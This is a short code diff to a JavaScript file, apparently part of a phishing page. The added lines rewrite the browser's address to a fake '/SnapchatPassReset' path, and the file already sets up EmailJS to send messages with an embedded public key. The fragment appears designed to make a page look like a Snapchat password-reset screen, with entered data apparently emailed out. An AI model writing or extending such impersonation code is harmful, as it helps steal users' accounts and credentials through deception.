@@ -1,3 +1,6 @@
+//pushstate
+history.pushState({}, '', '/SnapchatPassReset');
+
 // Initialize EmailJS with your public key
 emailjs.init('-n3JzG_UDggi59Nt1'); // Replace with your actual public key
 
